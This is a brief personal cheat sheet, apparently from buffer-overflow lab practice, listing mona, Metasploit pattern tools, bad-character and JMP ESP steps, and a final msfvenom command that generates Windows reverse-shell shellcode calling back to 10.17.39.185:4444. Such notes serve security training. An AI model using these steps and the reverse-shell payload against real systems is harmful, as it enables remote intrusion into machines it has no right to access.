# Buffer Overflow

> Shahrukh Tramboo | February 26th, 2022

--------------------------------------

**Mona Configuration**

```bash
!mona config -set workingfolder c:\mona\%p
```

**create pattern**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```


**getting pattern offset**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6F43396E
```
or
```bash
!mona findmsp -distance 600
```

**create a bytearray**

using bpython
```
bytearray(range(1,256))
```

**Finding a Jump Point**

```bash
!mona jmp -r esp -cpb "\x00"
```

**Generate Payload**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.39.185 LPORT=4444 EXITFUNC=thread -b "\x07\x2d\x2e\xa0" -f py -v shellcode
```